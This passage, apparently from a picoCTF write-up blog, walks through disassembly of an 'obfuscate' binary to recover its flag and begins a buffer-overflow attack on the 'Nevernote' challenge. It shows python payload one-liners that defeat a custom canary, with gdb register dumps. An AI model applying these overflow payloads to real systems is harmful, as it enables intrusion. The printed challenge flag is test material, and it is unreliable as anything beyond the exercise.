</span><span class='line'>   // 0x080487a0:b
</span><span class='line'>   0x80487a0: cmp    edx,0xb
</span><span class='line'>   0x80487a3: jne    0x80485de
</span><span class='line'>   0x80487a9: cmp    BYTE PTR <span class="o">[</span>esp+0x2e<span class="o">]</span>,0x0
</span><span class='line'>   0x80487ae: je     0x80485de
</span><span class='line'>   0x80487b4: mov    edx,0xc
</span><span class='line'>   0x80487b9: jmp    0x80485ab
</span><span class='line'>   0x80487be: xchg   ax,ax
</span><span class='line'>   0x080487c0:c
</span><span class='line'>   0x80487c0: cmp    edx,0x20
</span><span class='line'>   0x80487c3: jne    0x80485de
</span><span class='line'>   0x80487c9: cmp    BYTE PTR <span class="o">[</span>esp+0x2d<span class="o">]</span>,0x0
</span><span class='line'>   0x80487ce: je     0x80485de
</span><span class='line'>   0x80487d4: mov    edx,0x21
</span><span class='line'>   0x80487d9: jmp    0x80485ab
</span><span class='line'>   0x80487de: xchg   ax,ax
</span><span class='line'>  // 0x080487e0:d
</span><span class='line'>   0x80487e0: cmp    edx,0x3
</span><span class='line'>   0x80487e3: jne    0x80485de
</span><span class='line'>   0x80487e9: cmp    BYTE PTR <span class="o">[</span>esp+0x30<span class="o">]</span>,0x0
</span><span class='line'>   0x80487ee: je     0x80485de
</span><span class='line'>   0x80487f4: mov    edx,0x4
</span><span class='line'>   0x80487f9: jmp    0x80485ab
</span><span class='line'>   0x80487fe: xchg   ax,ax
</span><span class='line'>   // 0x08048800:e
</span><span class='line'>   0x8048800: cmp    edx,0x7
</span><span class='line'>   0x8048803: jne    0x80485de
</span><span class='line'>   0x8048809: cmp    BYTE PTR <span class="o">[</span>esp+0x31<span class="o">]</span>,0x0
</span><span class='line'>   0x804880e: je     0x80485de
</span><span class='line'>   0x8048814: mov    edx,0x8
</span><span class='line'>   0x8048819: jmp    0x80485ab
</span><span class='line'>   0x804881e: xchg   ax,ax
</span><span class='line'>   // 0x08048820:f
</span><span class='line'>   0x8048820: cmp    BYTE PTR <span class="o">[</span>esp+0x32<span class="o">]</span>,0x0
</span><span class='line'>   0x8048825: je     0x80485de
</span><span class='line'>   0x804882b: cmp    edx,0x8
</span><span class='line'>   0x804882e: jne    0x8048a9f
</span><span class='line'>   0x8048834: add    edx,0x1
</span><span class='line'>   0x8048837: jmp    0x80485ab
</span><span class='line'>   0x804883c: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048840:g
</span><span class='line'>   0x8048840: cmp    edx,0xc
</span><span class='line'>   0x8048843: sete   dl
</span><span class='line'>   0x8048846: xor    eax,eax
</span><span class='line'>   0x8048848: cmp    BYTE PTR <span class="o">[</span>esp+0x40<span class="o">]</span>,0x0
</span><span class='line'>   0x804884d: setne  al
</span><span class='line'>   0x8048850: and    eax,edx
</span><span class='line'>   0x8048852: jmp    0x80485e0
</span><span class='line'>   0x8048857: nop
</span><span class='line'>   // 0x08048858:h
</span><span class='line'>   0x8048858: cmp    edx,0xd
</span><span class='line'>   0x804885b: jne    0x80485de
</span><span class='line'>   0x8048861: cmp    BYTE PTR <span class="o">[</span>esp+0x33<span class="o">]</span>,0x0
</span><span class='line'>   0x8048866: je     0x80485de
</span><span class='line'>   0x804886c: mov    edx,0xe
</span><span class='line'>   0x8048871: jmp    0x80485ab
</span><span class='line'>   0x8048876: xchg   ax,ax
</span><span class='line'>   // 0x08048878:i
</span><span class='line'>   0x8048878: cmp    edx,0x9
</span><span class='line'>   0x804887b: jne    0x80485de
</span><span class='line'>   0x8048881: cmp    BYTE PTR <span class="o">[</span>esp+0x35<span class="o">]</span>,0x0
</span><span class='line'>   0x8048886: je     0x80485de
</span><span class='line'>   0x804888c: mov    edx,0xa
</span><span class='line'>   0x8048891: jmp    0x80485ab
</span><span class='line'>   0x8048896: xchg   ax,ax
</span><span class='line'>   // 0x08048898:j
</span><span class='line'>   0x8048898: cmp    edx,0xa
</span><span class='line'>   0x804889b: jne    0x80485de
</span><span class='line'>   0x80488a1: cmp    BYTE PTR <span class="o">[</span>esp+0x36<span class="o">]</span>,0x0
</span><span class='line'>   0x80488a6: je     0x80485de
</span><span class='line'>   0x80488ac: mov    edx,0xb
</span><span class='line'>   0x80488b1: jmp    0x80485ab
</span><span class='line'>   0x80488b6: xchg   ax,ax
</span><span class='line'>   // 0x080488b8:k
</span><span class='line'>   0x80488b8: cmp    edx,0xc
</span><span class='line'>   0x80488bb: sete   dl
</span><span class='line'>   0x80488be: xor    eax,eax
</span><span class='line'>   0x80488c0: cmp    BYTE PTR <span class="o">[</span>esp+0x37<span class="o">]</span>,0x0
</span><span class='line'>   0x80488c5: setne  al
</span><span class='line'>   0x80488c8: and    eax,edx
</span><span class='line'>   0x80488ca: jmp    0x80485e0    &lt;- terminate, compares eax to 1. If it is, the string is correct! <span class="nv">Flag</span> <span class="o">=</span> 09vdf7wefijbkh
</span><span class='line'>   0x80488cf: nop
</span><span class='line'>   // 0x080488d0:l
</span><span class='line'>   0x80488d0: cmp    edx,0x13
</span><span class='line'>   0x80488d3: jne    0x80485de
</span><span class='line'>   0x80488d9: cmp    BYTE PTR <span class="o">[</span>esp+0x38<span class="o">]</span>,0x0
</span><span class='line'>   0x80488de: je     0x80485de
</span><span class='line'>   0x80488e4: mov    edx,0x14
</span><span class='line'>   0x80488e9: jmp    0x80485ab
</span><span class='line'>   0x80488ee: xchg   ax,ax
</span><span class='line'>   // 0x080488f0:m
</span><span class='line'>   0x80488f0: cmp    edx,0x11
</span><span class='line'>   0x80488f3: jne    0x80485de
</span><span class='line'>   0x80488f9: cmp    BYTE PTR <span class="o">[</span>esp+0x39<span class="o">]</span>,0x0
</span><span class='line'>   0x80488fe: je     0x80485de
</span><span class='line'>   0x8048904: mov    edx,0x12
</span><span class='line'>   0x8048909: jmp    0x80485ab
</span><span class='line'>   0x804890e: xchg   ax,ax
</span><span class='line'>   // 0x08048910:n
</span><span class='line'>   0x8048910: cmp    edx,0x12
</span><span class='line'>   0x8048913: sete   dl
</span><span class='line'>   0x8048916: xor    eax,eax
</span><span class='line'>   0x8048918: cmp    BYTE PTR <span class="o">[</span>esp+0x39<span class="o">]</span>,0x0
</span><span class='line'>   0x804891d: setne  al
</span><span class='line'>   0x8048920: and    eax,edx
</span><span class='line'>   0x8048922: jmp    0x80485e0
</span><span class='line'>   0x8048927: nop
</span><span class='line'>   // 0x08048928:o
</span><span class='line'>   0x8048928: cmp    BYTE PTR <span class="o">[</span>esp+0x3a<span class="o">]</span>,0x0
</span><span class='line'>   0x804892d: je     0x80485de
</span><span class='line'>   0x8048933: cmp    edx,0x6
</span><span class='line'>   0x8048936: je     0x8048834
</span><span class='line'>   0x804893c: cmp    edx,0x1c
</span><span class='line'>   0x804893f: je     0x8048834
</span><span class='line'>   0x8048945: jmp    0x80485de
</span><span class='line'>   0x804894a: lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048950:p
</span><span class='line'>   0x8048950: cmp    edx,0x1e
</span><span class='line'>   0x8048953: jne    0x80485de
</span><span class='line'>   0x8048959: cmp    BYTE PTR <span class="o">[</span>esp+0x3c<span class="o">]</span>,0x0
</span><span class='line'>   0x804895e: xchg   ax,ax
</span><span class='line'>   0x8048960: je     0x80485de
</span><span class='line'>   0x8048966: mov    edx,0x1f
</span><span class='line'>   0x804896b: jmp    0x80485ab
</span><span class='line'>   // 0x08048970:q
</span><span class='line'>   0x8048970: cmp    edx,0x1d
</span><span class='line'>   0x8048973: jne    0x80485de
</span><span class='line'>   0x8048979: cmp    BYTE PTR <span class="o">[</span>esp+0x3d<span class="o">]</span>,0x0
</span><span class='line'>   0x804897e: je     0x80485de
</span><span class='line'>   0x8048984: mov    edx,0x1e
</span><span class='line'>   0x8048989: jmp    0x80485ab
</span><span class='line'>   0x804898e: xchg   ax,ax
</span><span class='line'>   // 0x08048990:r
</span><span class='line'>   0x8048990: cmp    edx,0x14
</span><span class='line'>   0x8048993: jne    0x80485de
</span><span class='line'>   0x8048999: cmp    BYTE PTR <span class="o">[</span>esp+0x3e<span class="o">]</span>,0x0
</span><span class='line'>   0x804899e: jne    0x8048668
</span><span class='line'>   0x80489a4: jmp    0x80485de
</span><span class='line'>   0x80489a9: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x080489b0:s
</span><span class='line'>   0x80489b0: cmp    edx,0x19
</span><span class='line'>   0x80489b3: jne    0x80485de
</span><span class='line'>   0x80489b9: cmp    BYTE PTR <span class="o">[</span>esp+0x3f<span class="o">]</span>,0x0
</span><span class='line'>   0x80489be: xchg   ax,ax
</span><span class='line'>   0x80489c0: je     0x80485de
</span><span class='line'>   0x80489c6: mov    edx,0x1a
</span><span class='line'>   0x80489cb: jmp    0x80485ab
</span><span class='line'>   // 0x080489d0:t
</span><span class='line'>   0x80489d0: cmp    edx,0x18
</span><span class='line'>   0x80489d3: sete   dl
</span><span class='line'>   0x80489d6: xor    eax,eax
</span><span class='line'>   0x80489d8: cmp    BYTE PTR <span class="o">[</span>esp+0x3e<span class="o">]</span>,0x0
</span><span class='line'>   0x80489dd: setne  al
</span><span class='line'>   0x80489e0: and    eax,edx
</span><span class='line'>   0x80489e2: jmp    0x80485e0
</span><span class='line'>   0x80489e7: nop
</span><span class='line'>   // 0x080489e8:u
</span><span class='line'>   0x80489e8: cmp    edx,0x1a
</span><span class='line'>   0x80489eb: jne    0x80485de
</span><span class='line'>   0x80489f1: cmp    BYTE PTR <span class="o">[</span>esp+0x41<span class="o">]</span>,0x0
</span><span class='line'>   0x80489f6: je     0x80485de
</span><span class='line'>   0x80489fc: mov    edx,0x1b
</span><span class='line'>   0x8048a01: jmp    0x80485ab
</span><span class='line'>   0x8048a06: xchg   ax,ax
</span><span class='line'>   // 0x08048a08:v
</span><span class='line'>   0x8048a08: cmp    edx,0x2
</span><span class='line'>   0x8048a0b: jne    0x80485de
</span><span class='line'>   0x8048a11: cmp    BYTE PTR <span class="o">[</span>esp+0x42<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a16: je     0x80485de
</span><span class='line'>   0x8048a1c: mov    edx,0x3
</span><span class='line'>   0x8048a21: jmp    0x80485ab
</span><span class='line'>   0x8048a26: xchg   ax,ax
</span><span class='line'>   // 0x08048a28:w
</span><span class='line'>   0x8048a28: cmp    edx,0x6
</span><span class='line'>   0x8048a2b: jne    0x80485de
</span><span class='line'>   0x8048a31: cmp    BYTE PTR <span class="o">[</span>esp+0x43<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a36: je     0x80485de
</span><span class='line'>   0x8048a3c: mov    edx,0x7
</span><span class='line'>   0x8048a41: jmp    0x80485ab
</span><span class='line'>   0x8048a46: xchg   ax,ax
</span><span class='line'>   // 0x08048a48:x
</span><span class='line'>   0x8048a48: cmp    edx,0x16
</span><span class='line'>   0x8048a4b: jne    0x80485de
</span><span class='line'>   0x8048a51: cmp    BYTE PTR <span class="o">[</span>esp+0x44<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a56: je     0x80485de
</span><span class='line'>   0x8048a5c: mov    edx,0x17
</span><span class='line'>   0x8048a61: jmp    0x80485ab
</span><span class='line'>   0x8048a66: xchg   ax,ax
</span><span class='line'>   // 0x08048a68:y
</span><span class='line'>   0x8048a68: cmp    edx,0x17
</span><span class='line'>   0x8048a6b: jne    0x80485de
</span><span class='line'>   0x8048a71: cmp    BYTE PTR <span class="o">[</span>esp+0x45<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a76: je     0x80485de
</span><span class='line'>   0x8048a7c: mov    edx,0x18
</span><span class='line'>   0x8048a81: jmp    0x80485ab
</span><span class='line'>   0x8048a86: xchg   ax,ax
</span><span class='line'>   // 0x08048a88:z
</span><span class='line'>   0x8048a88: cmp    edx,0x15
</span><span class='line'>   0x8048a8b: sete   dl
</span><span class='line'>   0x8048a8e: xor    eax,eax
</span><span class='line'>   0x8048a90: cmp    BYTE PTR <span class="o">[</span>esp+0x2d<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a95: setne  al
</span><span class='line'>   0x8048a98: and    eax,edx
</span><span class='line'>   0x8048a9a: jmp    0x80485e0
</span><span class='line'>   0x8048a9f: cmp    edx,0x4
</span><span class='line'>   0x8048aa2: je     0x8048834
</span><span class='line'>   0x8048aa8: jmp    0x80485de
</span><span class='line'>   0x8048aad: lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span><span class='line'>   0x8048ab0: call   0x80483e0 &lt;__stack_chk_fail@plt&gt;
</span></code></pre></td></tr></table></div></figure>


<p>From here, it was a matter of following the <code>mov edx, &lt;n&gt;</code> and <code>cmp edx, &lt;n&gt;</code> instructions. For instance, the first correct char of the password is &lsquo;0&rsquo;. <code>edx</code> is then set to 1. Next, I located the block:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   // 0x08048758:9
</span><span class='line'>   0x8048758: cmp    edx,0x1
</span><span class='line'>   0x804875b: jne    0x80485de
</span><span class='line'>   0x8048761: cmp    BYTE PTR <span class="o">[</span>esp+0x85<span class="o">]</span>,0x0
</span><span class='line'>   0x8048769: je     0x80485de
</span><span class='line'>   0x804876f: mov    edx,0x2
</span><span class='line'>   0x8048774: jmp    0x80485ab
</span></code></pre></td></tr></table></div></figure>


<p>So the next valid char must be <code>9</code>. I continued this process until I got up to 0x10. There was no <code>cmp edx, 0x10</code>. I verified the chars I had so far. It seems there is some trolling going on. There are two blocks that check for <code>cmp edx, 0x6</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   // 0x08048a28:w
</span><span class='line'>   0x8048a28: cmp    edx,0x6
</span><span class='line'>   0x8048a2b: jne    0x80485de
</span><span class='line'>   0x8048a31: cmp    BYTE PTR <span class="o">[</span>esp+0x43<span class="o">]</span>,0x0
</span><span class='line'>   0x8048a36: je     0x80485de
</span><span class='line'>   0x8048a3c: mov    edx,0x7
</span><span class='line'>   0x8048a41: jmp    0x80485ab
</span><span class='line'>   0x8048a46: xchg   ax,ax
</span><span class='line'>
</span><span class='line'>   ...and...
</span><span class='line'>
</span><span class='line'>   // 0x08048928:o
</span><span class='line'>   0x8048928: cmp    BYTE PTR <span class="o">[</span>esp+0x3a<span class="o">]</span>,0x0
</span><span class='line'>   0x804892d: je     0x80485de
</span><span class='line'>   0x8048933: cmp    edx,0x6
</span><span class='line'>   0x8048936: je     0x8048834
</span><span class='line'>   0x804893c: cmp    edx,0x1c
</span><span class='line'>   0x804893f: je     0x8048834
</span><span class='line'>   0x8048945: jmp    0x80485de
</span><span class='line'>   0x804894a: lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>At first, I had selected &lsquo;o&rsquo;, but it turns out it should have been &lsquo;w&rsquo;. The string comparison stops at &lsquo;k&rsquo;:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   // 0x080488b8:k
</span><span class='line'>   0x80488b8: cmp    edx,0xc
</span><span class='line'>   0x80488bb: sete   dl
</span><span class='line'>   0x80488be: xor    eax,eax
</span><span class='line'>   0x80488c0: cmp    BYTE PTR <span class="o">[</span>esp+0x37<span class="o">]</span>,0x0
</span><span class='line'>   0x80488c5: setne  al
</span><span class='line'>   0x80488c8: and    eax,edx
</span><span class='line'>   0x80488ca: jmp    0x80485e0    &lt;- terminate, compares eax to 1.
</span><span class='line'>                                       If it is, the string is correct!
</span><span class='line'>   0x80488cf: nop
</span></code></pre></td></tr></table></div></figure>


<p>Through a bit of trial-and-error I arrived at the password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf/obfus<span class="nv">$ </span>./obfuscate
</span><span class='line'>Password: 09vdf7wefijbkh
</span><span class='line'>Correct!
</span></code></pre></td></tr></table></div></figure>


<p>So the flag is <code>09vdf7wefijbkh</code>.</p>

<h1>Nevernote (180 points)</h1>

<p><code>
In light of the recent attacks on their machines, Daedalus Corp has
implemented a buffer overflow detection library. Nevernote, a program made
for Daedalus Corps employees to take notes, uses this library. Can you
bypass their protection and read the secret? The binary can be found at
 /home/nevernote/ on the shell server.
</code></p>

<p>This program attempts to implement a stack canary in a rather dumb way:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">canary</span><span class="p">{</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">canary</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="o">*</span><span class="n">verify</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* buffer overflow resistant buffer */</span>
</span><span class='line'><span class="k">struct</span> <span class="n">safe_buffer</span><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">SAFE_BUFFER_SIZE</span><span class="p">];</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">canary</span> <span class="n">can</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>So we can overflow this <code>safe_buffer</code>, but then we also overwrite the canary. Then the canary check will not pass anymore:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">verify_canary</span><span class="p">(</span><span class="k">struct</span> <span class="n">canary</span> <span class="o">*</span><span class="n">c</span><span class="p">){</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">c</span><span class="o">-&gt;</span><span class="n">canary</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="n">c</span><span class="o">-&gt;</span><span class="n">verify</span><span class="p">)){</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Canary was incorrect!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">__canary_failure</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// we&#39;re all good; free the canary and return</span>
</span><span class='line'>    <span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="o">-&gt;</span><span class="n">verify</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>But since we can overflow the buffer, we control both the canary and the pointer to the canary. This means we can make this check always succeed. Again, no ASLR on the target server allows us to use a static address. Let&rsquo;s supply the address of safe_buffer (the address of which can be obtained from debugging the binary with <code>gdb</code>). This is automated like so (it echoes a username and the command for adding a note):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="err">$</span> <span class="p">(</span><span class="n">echo</span> <span class="s">&quot;bleh&quot;</span><span class="p">;</span> <span class="n">echo</span> <span class="s">&quot;a&quot;</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">512</span><span class="o">+</span><span class="s">&quot;AAAA&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x50\xc0\x04\x08</span><span class="s">&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="p">...</span><span class="n">snip</span><span class="p">...</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">The</span> <span class="n">program</span> <span class="n">being</span> <span class="n">debugged</span> <span class="n">has</span> <span class="n">been</span> <span class="n">started</span> <span class="n">already</span><span class="p">.</span>
</span><span class='line'><span class="n">Start</span> <span class="n">it</span> <span class="n">from</span> <span class="n">the</span> <span class="n">beginning</span><span class="o">?</span> <span class="p">(</span><span class="n">y</span> <span class="n">or</span> <span class="n">n</span><span class="p">)</span> <span class="n">y</span>
</span><span class='line'>
</span><span class='line'><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="o">/</span><span class="n">nevernote</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="nl">name</span><span class="p">:</span> <span class="n">Enter</span> <span class="n">a</span> <span class="nl">command</span><span class="p">:</span> <span class="n">Write</span> <span class="n">your</span> <span class="nl">note</span><span class="p">:</span> <span class="n">Note</span> <span class="n">added</span><span class="p">.</span>
</span><span class='line'><span class="o">***</span> <span class="n">Error</span> <span class="n">in</span> <span class="err">`</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="o">/</span><span class="n">nevernote</span><span class="err">&#39;</span><span class="o">:</span> <span class="kt">double</span> <span class="n">free</span> <span class="n">or</span> <span class="n">corruption</span> <span class="p">(</span><span class="o">!</span><span class="n">prev</span><span class="p">)</span><span class="o">:</span> <span class="mh">0x0804c050</span> <span class="o">***</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, the binary aborts because the pointer to the canary has already been freed. Not a problem, we won&rsquo;t let it come that far. Let&rsquo;s try to overflow the saved return address:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pico1139</span><span class="err">@</span><span class="nl">shell</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="err">$</span> <span class="p">(</span><span class="n">echo</span> <span class="s">&quot;bleh&quot;</span><span class="p">;</span> <span class="n">echo</span> <span class="s">&quot;a&quot;</span><span class="p">;</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">512</span><span class="o">+</span><span class="s">&quot;AAAA&quot;</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x50\xc0\x04\x08CC</span><span class="s">CCCCCCCCCCCCCCDDDDEEEEFFFF&quot;</span><span class="err">&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">Starting</span> <span class="nl">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">nevernote</span><span class="o">/</span><span class="n">nevernote</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">in</span>
</span><span class='line'><span class="n">Please</span> <span class="n">enter</span> <span class="n">your</span> <span class="nl">name</span><span class="p">:</span> <span class="n">Enter</span> <span class="n">a</span> <span class="nl">command</span><span class="p">:</span> <span class="n">Write</span> <span class="n">your</span> <span class="nl">note</span><span class="p">:</span>
</span><span class='line'><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
</span><span class='line'><span class="mh">0xf7ea11f3</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span> <span class="n">from</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">i</span> <span class="n">r</span>
</span><span class='line'><span class="n">eax</span>            <span class="mh">0x45454545</span>  <span class="mi">1162167621</span>
</span><span class='line'><span class="n">ecx</span>            <span class="mh">0xffffd414</span>  <span class="o">-</span><span class="mi">11244</span>
</span><span class='line'><span class="n">edx</span>            <span class="mh">0x45454545</span>  <span class="mi">1162167621</span>
</span><span class='line'><span class="n">ebx</span>            <span class="mh">0x3f4</span>   <span class="mi">1012</span>
</span><span class='line'><span class="n">esp</span>            <span class="mh">0xffffd3f0</span>  <span class="mh">0xffffd3f0</span>
</span><span class='line'><span class="n">ebp</span>            <span class="mh">0xffffd628</span>  <span class="mh">0xffffd628</span>
</span><span class='line'><span class="n">esi</span>            <span class="mh">0xffffd420</span>  <span class="o">-</span><span class="mi">11232</span>
</span><span class='line'><span class="n">edi</span>            <span class="mh">0x45454545</span>  <span class="mi">1162167621</span>
</span><span class='line'><span class="n">eip</span>            <span class="mh">0xf7ea11f3</span>  <span class="mh">0xf7ea11f3</span>
</span><span class='line'><span class="n">eflags</span>         <span class="mh">0x10282</span> <span class="p">[</span> <span class="n">SF</span> <span class="n">IF</span> <span class="n">RF</span> <span class="p">]</span>
</span><span class='line'><span class="n">cs</span>             <span class="mh">0x23</span>    <span class="mi">35</span>
</span><span class='line'><span class="n">ss</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">ds</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">es</span>             <span class="mh">0x2b</span>    <span class="mi">43</span>
</span><span class='line'><span class="n">fs</span>             <span class="mh">0x0</span> <span class="mi">0</span>
</span><span class='line'><span class="n">gs</span>             <span class="mh">0x63</span>    <span class="mi">99</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="err">$</span><span class="n">eip</span>
</span><span class='line'><span class="o">=&gt;</span> <span class="mh">0xf7ea11f3</span><span class="o">:</span>   <span class="n">movlpd</span> <span class="o">%</span><span class="n">xmm1</span><span class="p">,(</span><span class="o">%</span><span class="n">edx</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


